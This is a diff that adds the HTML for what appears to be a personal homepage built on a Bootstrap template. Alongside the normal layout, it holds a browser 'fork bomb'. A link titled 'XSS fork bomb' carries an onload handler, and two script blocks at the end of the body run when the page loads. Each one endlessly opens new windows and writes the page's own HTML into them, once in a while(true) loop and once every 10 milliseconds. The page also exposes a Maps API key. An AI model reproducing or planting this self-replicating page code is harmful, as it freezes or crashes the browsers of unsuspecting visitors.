@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="The best website you'll ever find. ">
+    <meta name="author" content="Chris Frewin, of course!">
+
+    <title>✨chrisfrew.in - Home✨</title>
+
+    <!-- Favicon -->
+    <link rel="shortcut icon" href="img/favblue.ico"> <!--favicon (little block image that represents the site)-->
+
+
+    <!-- Bootstrap Core CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="css/grayscale.css" rel="stylesheet">
+
+    <!-- animate.css (for textillate) -->
+    <link href="css/animate.css" rel="stylesheet">
+
+    <!-- Custom Fonts -->
+    <link href="font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+    <link href="http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
+    <link href="http://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
+
+</head>
+
+<body id="page-top" data-spy="scroll" data-target=".navbar-fixed-top">
+
+    <!-- Intro Header -->
+    <header class="intro">
+        <div class="intro-body">
+            <div class="container">
+                <div class="row">
+                    <div class="col-sm-8 col-md-offset-2">
+                        <h1 class="brand-heading tlt" data-in-effect="bounceInDown" data-in-shuffle="true">
+                            <a href="#" onload="function() { while (true) { var w = window.open(); w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML); } }">XSS fork bomb</a>
+                        </h1>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container text-center">
+            <p><supertiny>This page is a (heavily) modified form of a Bootstrap template. | Powered by Linux. | Hosted Via (Devon's) Rasperry Pi. | &copy; Chris Frewin 2015.</supertiny></p>
+        </div>
+    </footer>
+
+    <!-- jQuery -->
+    <script src="js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="js/bootstrap.min.js"></script>
+
+    <!-- Plugin JavaScript -->
+    <script src="js/jquery.easing.min.js"></script>
+
+    <!-- Google Maps API Key - Use your own API key to enable the map feature. More information on the Google Maps API can be found at https://developers.google.com/maps/ -->
+    <script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCRngKslUGJTlibkQ3FkfTxj3Xss1UlZDA&sensor=false"></script>
+
+    <!-- Custom Theme JavaScript -->
+    <script src="js/grayscale.js"></script>
+
+    <!-- Lettering javascript! Getting serious now! -->
+    <script src="js/lettering.js"></script> <!-- lettering. -->
+
+    <!-- textillate -->
+    <script src="js/jquery.textillate.js"></script>
+
+    <script>
+
+    $(function () {
+        $('.tlt').textillate();
+    })
+
+    </script>
+
+    <script>
+
+    while (true) {
+        var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+    }
+    
+    </script>
+
+    <script>
+        setInterval(function() {
+        var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+    }, 10);
+    </script>
+
+</body>
+
+</html>
